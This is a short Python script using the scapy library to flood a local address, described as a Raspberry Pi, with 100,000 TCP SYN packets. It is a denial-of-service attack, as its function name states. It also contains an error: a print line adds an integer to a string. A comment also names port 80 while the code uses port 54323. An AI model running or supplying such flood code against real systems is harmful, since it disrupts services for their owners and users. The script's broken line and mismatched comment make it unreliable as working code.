from scapy.all import IP, TCP, RandShort, send

def dos_attack():
    for i in range(100000):
        ip = IP(dst="192.168.10.1") # raspberry pi ip address
        tcp = TCP(sport=54323, dport=54323, flags="S", seq=RandShort()) # SYN packet on port 80
        packet = ip / tcp
        # display packet
        print(packet)
        print(len(packet) + "\n")
        send(packet)
        
dos_attack()

# I have used 54321, 54322, 54323